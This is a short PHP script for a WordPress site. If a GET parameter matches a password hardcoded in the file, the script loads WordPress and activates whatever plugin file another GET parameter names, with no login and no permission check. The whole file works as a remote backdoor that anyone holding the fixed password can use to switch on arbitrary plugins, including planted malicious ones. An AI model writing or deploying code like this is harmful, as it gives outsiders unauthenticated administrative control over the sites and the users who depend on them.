<?php
    if (isset($_GET['password'])) {
    	if($_GET['password'] == 'New@Store5000New') {
		    include 'wp-load.php';

		    if (isset($_GET['pluginfilename'])) {
		    	$result = activate_plugin( $_GET['pluginfilename'] );
				if ( is_wp_error( $result ) ) {
				    // Process Error
				}
		    }

		}	    
	}
?>